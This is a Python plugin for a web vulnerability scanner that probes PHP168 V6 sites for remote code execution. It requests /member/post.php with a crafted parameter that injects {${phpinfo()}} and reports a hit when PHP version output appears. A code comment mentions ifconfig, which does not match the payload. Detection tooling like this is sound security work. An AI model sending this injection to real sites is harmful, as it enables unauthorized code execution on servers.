#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger


def run_domain(http,ob):
    result = []
    try:
        frame = ob.get('siteType')
        if frame and frame in ['jsp', 'asp', 'aspx']:
            return []

        scheme = ob['scheme']
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        result = []


        # 原始恶意请求，在发送请求之前会做urlencode
        inj_path_list = [
            # 执行命令 ifconfig,并将结果回显；检测关键字 HWaddr|inet addr
            """/member/post.php?only=1&showHtml_Type[bencandy][1]={${phpinfo()}}&aid=1&job=endHTML"""
        ]


        for inj_path in inj_path_list:
            new_url = "%s://%s%s" % (scheme, domain, inj_path)
            res, content = http.request(new_url, 'GET', headers=header)
            if res and res.get('status') == '200' and re.search(r'php\s+version', content, re.I):
                detail = "检测到PHP168远程命令执行漏洞"
                request = getRequest(new_url, domain=ob['domain'])
                response = getResponse(res, content)
                result.append(getRecord(ob, new_url, ob['level'], detail, request, response))

    except Exception, e:
        logger.error("File:PHP168V6_02RemoteExcScript_yd.py, run_domain function :%s" % (str(e)))

    return result



